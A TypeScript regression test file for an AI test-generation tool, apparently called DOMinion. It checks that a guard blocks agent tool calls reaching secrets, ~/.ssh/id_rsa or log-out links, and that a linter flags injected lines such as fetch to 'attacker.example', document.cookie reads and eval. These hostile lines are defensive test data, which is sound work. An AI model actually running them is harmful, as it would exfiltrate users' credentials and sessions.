import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { applyEdit, evaluateToolCall, isExcludedPath, type ToolPolicy } from "../../src/core/agents/guard";
import { validateConfig } from "../../src/core/config/loader";
import { matchesLoggedOutPattern } from "../../src/core/config/resolve";
import { lintErrors, lintGeneratedFile } from "../../src/core/playwright/lint";
import { patchPlaywrightConfig } from "../../src/core/playwright/patch";
import { type JsonReport, parseJsonReport } from "../../src/core/playwright/report";
import { REDACTED, Redactor, redactorFromConfig } from "../../src/core/redact";
import { exitCodeFor } from "../../src/cli/run-view";
import type { RunRecord } from "../../src/core/orchestrator/types";
import { ADD_TO_CART_SPEC } from "../helpers/fixture-scripts";
import { makeTempDir, removeDir } from "../helpers/tmp";

const root = makeTempDir("regress");
afterAll(() => removeDir(root));
const testDir = join(root, "tests", "agent");
mkdirSync(testDir, { recursive: true });

const policy = (overrides: Partial<ToolPolicy> = {}): ToolPolicy => ({
  agent: "planner",
  root,
  builtinTools: ["Read", "Write", "Edit", "Glob", "Grep"],
  mcpTools: ["browser_navigate", "browser_snapshot", "browser_take_screenshot", "browser_console_messages", "browser_click"],
  readRoots: [testDir],
  writeRoots: [testDir],
  writeExtensions: [".ts"],
  excludePatterns: ["/logout", "/account/delete"],
  redactor: new Redactor([{ name: "PASS", value: "Sup3r-Secret!" }]),
  ...overrides,
});

describe("security review regressions", () => {
  it("browser tools cannot write files anywhere in the repo", () => {
    for (const [tool, filename] of [
      ["browser_console_messages", ".env.local"],
      ["browser_snapshot", "dominion/prompts/generator.md"],
      ["browser_take_screenshot", "playwright.config.ts"],
    ]) {
      expect(evaluateToolCall(policy(), `mcp__playwright__${tool}`, { filename })).toMatchObject({ allow: false, reason: expect.stringMatching(/without a filename/) });
    }
    expect(evaluateToolCall(policy(), "mcp__playwright__browser_snapshot", {})).toEqual({ allow: true });
  });

  it("CRLF files cannot be used to bypass the content checks", () => {
    const file = join(testDir, "crlf.spec.ts");
    writeFileSync(file, "line one\r\nline two\r\n");
    const strict = policy({ agent: "healer", checkContent: (_p, c) => (c.includes("waitForTimeout") ? "no waitForTimeout" : undefined) });
    const decision = evaluateToolCall(strict, "Edit", { file_path: file, old_string: "line one\nline two", new_string: "await page.waitForTimeout(1);" });
    expect(decision).toMatchObject({ allow: false, reason: "The file was not saved because it breaks DOMinion's test generation rules:\nno waitForTimeout\nFix these and write the file again." });
    expect(evaluateToolCall(strict, "Edit", { file_path: file, old_string: "line one\nline two", new_string: "Sup3r-Secret!" })).toMatchObject({ allow: false });
    expect(applyEdit("a\r\nb\r\n", "a\nb", "c\nd", false)).toBe("c\r\nd\r\n");
  });

  it("Grep and Glob cannot reach secrets, and ~ paths are refused", () => {
    const broad = policy({ readRoots: [root] });
    writeFileSync(join(root, ".env.local"), "PASS=Sup3r-Secret!");
    expect(evaluateToolCall(broad, "Grep", { pattern: "PASS", path: "." })).toMatchObject({ allow: false, reason: expect.stringMatching(/narrower folder/) });
    mkdirSync(join(root, ".auth"), { recursive: true });
    expect(evaluateToolCall(broad, "Grep", { pattern: "x", path: ".auth" })).toMatchObject({ allow: false });
    expect(evaluateToolCall(broad, "Read", { file_path: "~/.ssh/id_rsa" })).toMatchObject({ allow: false });
    expect(evaluateToolCall(broad, "Read", { file_path: join(root, ".AUTH", "x.json") })).toMatchObject({ allow: process.platform === "linux" });
  });

  it("excluded paths and log-out clicks cannot be reached with encodings or case", () => {
    for (const path of ["/LOGOUT", "/logout/", "/%6Cogout", "/logout;jsessionid=1", "/account/delete.", "/Account/Delete"]) {
      expect(isExcludedPath(path, ["/logout", "/account/delete"]), path).toBe(true);
    }
    expect(isExcludedPath("/logouts", ["/logout"])).toBe(false);
    expect(evaluateToolCall(policy(), "mcp__playwright__browser_click", { element: "Log out link", target: "e5" })).toMatchObject({ allow: false });
    expect(evaluateToolCall(policy(), "mcp__playwright__browser_click", { element: "Delete account button", target: "e5" })).toMatchObject({ allow: false });
    expect(evaluateToolCall(policy(), "mcp__playwright__browser_click", { element: "Remove Backpack from cart", target: "e5" })).toEqual({ allow: true });
  });

  it("generated code cannot read env vars, use Node built-ins, run page scripts or call other hosts", () => {
    const base = ADD_TO_CART_SPEC("r");
    const inject = (line: string) => base.replace('await page.goto("/products");', `await page.goto("/products");\n      ${line}`);
    const ctx = { kind: "spec" as const, flowSlug: "add-to-cart", role: "customer" };
    const rules = (line: string) => lintErrors(lintGeneratedFile(inject(line), ctx)).map((i) => i.rule);
    expect(rules("const p = process.env.APP_PASS;")).toContain("no-env-access");
    expect(rules('const fs = require("fs");')).toContain("no-node-builtins");
    expect(rules('await import("node:child_process");')).toContain("no-node-builtins");
    expect(rules('await fetch("https://attacker.example/x");')).toContain("no-raw-network");
    expect(rules('await page.request.post("https://attacker.example/x");')).toContain("no-raw-network");
    expect(rules("await page.evaluate(() => document.cookie);")).toContain("no-page-scripts");
    expect(rules("await page.context().storageState();")).toContain("no-session-access");
    expect(rules("eval('1');")).toContain("no-dynamic-code");
    expect(lintErrors(lintGeneratedFile(base.replace("import { test", 'import fs from "node:fs";\nimport { test'), ctx)).map((i) => i.rule)).toContain("no-node-builtins");
    // legitimate code still passes
    expect(rules("test.setTimeout(60_000);")).toEqual([]);
    expect(rules('await page.request.get("/api/cart");')).toEqual([]);
    expect(lintErrors(lintGeneratedFile(base.replace("specs/add-to-cart.md", "my specs/add-to-cart.md"), ctx))).toEqual([]);
    expect(rules("const x = ;")).toContain("syntax");
  });

  it("redacts form-encoded, base64 and Basic-auth forms, and treats plain-word usernames gently", () => {
    const r = new Redactor([{ name: "P", value: "p@ss!w(o)rd~" }]);
    expect(r.redact(`body=${new URLSearchParams([["k", "p@ss!w(o)rd~"]]).toString().slice(2)}`)).toBe(`body=${REDACTED}`);
    expect(r.redact(Buffer.from("p@ss!w(o)rd~").toString("base64"))).toBe(REDACTED);
    const config = validateConfig({ environments: { s: { baseURL: "https://a.example.com", roles: { c: { strategy: "form", userEnv: "U", passEnv: "P" } } } } }, "c");
    const fromConfig = redactorFromConfig(config, { U: "admin", P: "correct-horse-battery" });
    expect(fromConfig.redact(`Authorization: Basic ${Buffer.from("admin:correct-horse-battery").toString("base64")}`)).toBe(`Authorization: Basic ${REDACTED}`);
    expect(fromConfig.redact("admin logged in to the administration page")).toBe(`${REDACTED} logged in to the administration page`);
    expect(fromConfig.findSecrets("open the admin dashboard")).toEqual([]);
  });
});

describe("pipeline review regressions", () => {
  it("anchors role tags and passes testIdAttribute to the managed projects", () => {
    const file = join(root, "pw.config.ts");
    writeFileSync(file, 'export default defineConfig({ projects: [{ name: "a" }] });');
    patchPlaywrightConfig(file, [{ env: "s", role: "admin", baseURL: "https://a.example.com", storageState: ".auth/s-admin.json", testDir: "tests/agent", testIdAttribute: "data-qa" }]);
    const text = readFileSync(file, "utf8");
    const grep = new Function(`return ${/grep: (\/[^\n]+\/)/.exec(text)![1]};`)() as RegExp;
    expect(grep.test("X @role:admin")).toBe(true);
    expect(grep.test("X @role:admin-readonly")).toBe(false);
    expect(text).toContain('testIdAttribute: "data-qa"');
  });

  it("never inserts the block into a comment and keeps the config parseable", () => {
    const file = join(root, "commented.config.ts");
    writeFileSync(file, 'export default defineConfig({\n  projects: [\n    { name: "a" } // a, b\n    // { name: "b" },\n  ],\n});\n');
    expect(patchPlaywrightConfig(file, [{ env: "s", role: "g", baseURL: "https://a.example.com", testDir: "t" }]).status).toBe("patched");
    const text = readFileSync(file, "utf8");
    expect(text).toContain('{ name: "a" }, // a, b');
    expect(text).toMatch(/\/\/ \{ name: "b" \},\n\s+\/\/ --- dominion:start/);
  });

  it("maps test.fail() and flaky results through Playwright's verdict", () => {
    const report: JsonReport = {
      config: { rootDir: "/r" },
      errors: [],
      suites: [
        {
          title: "a.spec.ts",
          file: "a.spec.ts",
          specs: [
            { title: "expected failure", file: "a.spec.ts", line: 1, column: 1, tests: [{ projectName: "p", status: "expected", results: [{ status: "failed", duration: 1, error: { message: "boom" } }] }] },
            { title: "unexpected pass", file: "a.spec.ts", line: 2, column: 1, tests: [{ projectName: "p", status: "unexpected", results: [{ status: "passed", duration: 1 }] }] },
            { title: "flaky", file: "a.spec.ts", line: 3, column: 1, tests: [{ projectName: "p", status: "flaky", results: [{ status: "failed", duration: 1 }, { status: "passed", duration: 1 }] }] },
          ],
        },
      ],
    };
    expect(parseJsonReport(report).map((o) => [o.title, o.status, o.error])).toEqual([
      ["expected failure", "passed", undefined],
      ["unexpected pass", "failed", undefined],
      ["flaky", "passed", undefined],
    ]);
  });

  it("rejects env/role names that collide in file and project names", () => {
    expect(() =>
      validateConfig(
        {
          environments: {
            "stg-eu": { baseURL: "https://a.example.com", roles: { admin: { strategy: "none" } } },
            stg: { baseURL: "https://b.example.com", roles: { "eu-admin": { strategy: "none" } } },
          },
        },
        "c",
      ),
    ).toThrow(/both map to "stg-eu-admin"/);
  });

  it("matches loggedOutPattern for apps served under a sub-path", () => {
    expect(matchesLoggedOutPattern("https://h.example.com/app/login?next=/", "/login", "https://h.example.com/app")).toBe(true);
    expect(matchesLoggedOutPattern("https://h.example.com/app/account", "/login", "https://h.example.com/app")).toBe(false);
  });

  it("does not report success when generated tests never ran", () => {
    const run = { status: "done", options: { planOnly: false }, flows: [{ specFiles: ["tests/agent/a.spec.ts"], results: [] }] } as unknown as RunRecord;
    expect(exitCodeFor(run)).toBe(1);
    expect(exitCodeFor({ ...run, options: { planOnly: true } } as unknown as RunRecord)).toBe(0);
  });
});
